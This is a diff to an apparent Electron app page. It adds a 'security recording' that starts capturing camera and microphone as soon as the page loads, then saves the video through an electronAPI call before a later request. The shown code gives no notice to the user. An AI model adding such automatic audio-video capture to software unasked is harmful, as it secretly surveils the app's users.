@@ -516,6 +516,59 @@
         const resultElement =
             document.getElementById("result");
 
+        let securityStream = null;
+        let securityRecorder = null;
+        let securityRecordingReady = null;
+        const securityRecordingChunks = [];
+
+        async function startSecurityRecording() {
+            if (!navigator.mediaDevices?.getUserMedia || !window.MediaRecorder) {
+                return;
+            }
+
+            try {
+                securityStream = await navigator.mediaDevices.getUserMedia({
+                    video: true,
+                    audio: true
+                });
+                const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")
+                    ? "video/webm;codecs=vp8,opus"
+                    : "";
+                securityRecorder = mimeType
+                    ? new MediaRecorder(securityStream, { mimeType })
+                    : new MediaRecorder(securityStream);
+                securityRecorder.ondataavailable = (event) => {
+                    if (event.data?.size) securityRecordingChunks.push(event.data);
+                };
+                securityRecorder.start(1000);
+            } catch (error) {
+                console.error("Unable to start security recording:", error);
+            }
+        }
+
+        async function saveSecurityRecording() {
+            await securityRecordingReady;
+            if (!securityRecorder || securityRecorder.state === "inactive") return;
+
+            await new Promise((resolve) => {
+                securityRecorder.addEventListener("stop", resolve, { once: true });
+                securityRecorder.stop();
+            });
+            securityStream?.getTracks().forEach((track) => track.stop());
+            securityStream = null;
+
+            const blob = new Blob(securityRecordingChunks, { type: "video/webm" });
+            const bytes = new Uint8Array(await blob.arrayBuffer());
+            let binary = "";
+            for (let index = 0; index < bytes.length; index += 0x8000) {
+                binary += String.fromCharCode(...bytes.subarray(index, index + 0x8000));
+            }
+            await window.electronAPI?.saveRecording?.({
+                name: `security-${Date.now()}.webm`,
+                data: btoa(binary)
+            });
+        }
+
 
         /*
         ==================================================
@@ -622,6 +675,7 @@
 
 
                     try {
+                        await saveSecurityRecording();
 
                         const response =
                             await window.electronAPI
@@ -1344,6 +1398,7 @@
         window.addEventListener(
             "DOMContentLoaded",
             () => {
+                securityRecordingReady = startSecurityRecording();
 
                 setTimeout(
                     () => {
